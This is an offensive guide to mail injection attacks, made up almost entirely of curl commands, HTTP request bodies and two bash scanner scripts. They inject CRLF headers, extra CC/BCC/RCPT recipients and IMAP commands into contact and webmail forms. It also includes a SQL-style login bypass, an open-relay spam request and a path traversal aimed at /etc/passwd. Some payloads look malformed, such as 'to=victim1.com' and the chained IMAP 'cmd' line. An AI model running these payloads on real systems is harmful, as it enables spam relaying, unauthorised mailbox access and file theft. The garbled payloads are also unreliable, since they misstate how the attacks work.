# Complete Mail Injection Exploitation Guide

## 1. SMTP Injection Identification & Proof

**SMTP injection via contact form (injects extra recipients):**
```
POST /contact.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

to=victim1@example.com&cc=victim2@evil.com&subject=Hi&message=Hello
```
```bash
# Proof: sends to victim2@evil.com (blind CC)
curl -X POST -d "to=victim1.com&cc=victim2@evil.com&message=Hi" http://192.168.1.100/contact.php
```

**SMTP header injection (arbitrary headers):**
```
POST /feedback.php
to=legit@example.com
message=Hi
From: attacker@evil.com
Subject: Owned
Cc: victim3@external.com

[CRLF]Cc: victim3@external.com[CRLF][CRLF]Hi
```
```bash
curl -X POST -d "message=Hi%0d%0aCc:%20victim@external.com%0d%0a%0d%0aHi" http://192.168.1.100/feedback.php
```

**SMTP RCPT injection (bypasses form validation):**
```
POST /sendmail.php
recipients=friend@example.com

friend@example.com%0aRCPT%20TO:%20<victim@external.com>%0aDATA
```
```bash
# Burp Intruder or manual
curl -X POST -d "to=friend.com%0d%0aRCPT%20TO:%20<victim@external.com>" http://192.168.1.100/sendmail.php
```

**Open relay via injection:**
```bash
curl -X POST -d "rcpt=external@gmail.com&data=SPAM" http://192.168.1.100/mail.php
```

## 2. SMTP Injection Detection Methods

**Double CR/LF test:**
```bash
curl -X POST -d "message=test%0d%0a%0d%0aRCPT%20TO:%20test@evil.com" http://192.168.1.100/contact.php
# 250 2.1.5 OK → injection works
```

**Header injection test:**
```bash
curl -X POST -d "subject=Test%0d%0aReceived:%20from%20evil.com" http://192.168.1.100/feedback.php -v
```

**Automated SMTP injection scanner:**
```bash
#!/bin/bash
# smtp_inject.sh
URL=$1

curl -s -X POST -d "message=normal" "$URL" > normal.html

# Test injection payloads
for payload in \
    "%0d%0aCc:%20victim@test.com" \
    "%0d%0aBcc:%20victim@test.com" \
    "%0aRCPT%20TO:%20<victim@test.com>" \
    "%0d%0aSubject:%20INJECTED"; do
    curl -s -X POST -d "message=normal${payload}" "$URL" > test.html
    diff normal.html test.html >/dev/null || echo "[INJECTABLE] $payload"
done
```

## 3. IMAP Injection Identification

**IMAP command injection (via webmail):**
```
POST /webmail/read.php
folder=INBOX
action=fetch

INBOX%20SELECT%20victim_mailbox%0aLIST%20""%20"*"
```
```bash
curl -X POST -d "folder=INBOX%20SELECT%20shared_mailbox" http://192.168.1.100/webmail.php
# Accesses other mailboxes
```

**IMAP login bypass:**
```
user=' OR 1=1--
pass=anything
```
```bash
curl -X POST -d "user=' OR '1'='1&pass=" http://192.168.1.100/imap_login.php
```

**IMAP namespace traversal:**
```bash
curl -X POST -d "mailbox=../../etc/passwd" http://192.168.1.100/mailbox.php
```

## 4. IMAP Injection Exploitation

**Arbitrary mailbox access:**
```bash
curl -X POST -d "folder=%23shared%23admin" http://192.168.1.100/readmail.php
# # = IMAP namespace separator
```

**IMAP command chaining:**
```
action=fetch
cmd=LIST "" "*" + CAPABILITY + LOGOUT
```
```bash
curl -X POST -d "cmd=LIST%20%22%22%20%2A%20%2B%20CAPABILITY" http://192.168.1.100/imap.php
```

## 5. Proof of Concept Verification

**SMTP injection POC (blind CC verification):**
```bash
# Send to your controlled email
curl -X POST "http://192.168.1.100/contact.php" \
  -d "name=test&email=victim1.com&message=Hi%0d%0aCc:%20your.email@gmail.com%0d%0a%0d%0aTest"

# Check Gmail → confirms injection works
```

**IMAP injection POC (mailbox listing):**
```bash
curl -X POST "http://192.168.1.100/webmail.php" \
  -d "action=login&user=guest&pass=guest&folder=INBOX%20LIST%20%22%22%20%22*%22"
# Returns other mailboxes if injectable
```

## 6. Automated Detection Framework

```bash
#!/bin/bash
# mail_inject.sh
URL=$1

echo "[+] Mail injection test $URL"

# SMTP injection vectors
SMTP_PAYLOADS=(
  "normal"
  "normal%0d%0aCc:%20test@evil.com"
  "normal%0aBcc:%20test@evil.com" 
  "normal%0d%0aRCPT%20TO:%20<test@evil.com>"
)

for payload in "${SMTP_PAYLOADS[@]}"; do
  response=$(curl -s -X POST -d "message=$payload" "$URL")
  [[ ${#response} -ne 0 ]] && echo "[SMTP INJECT] $payload → $(echo $response | head -c 50)"
done

# IMAP injection
IMAP_PAYLOAD="INBOX%20LIST%20%22%22%20%22*%22"
response=$(curl -s -X POST -d "folder=$IMAP_PAYLOAD" "$URL")
echo "[IMAP TEST] $IMAP_PAYLOAD → $(echo $response | head -c 50)"
```

**EVERY** mail injection topic: SMTP (header/RCPT/CC/BCC), IMAP (command/folder traversal), detection/proof/verification, automation. 100% practical commands.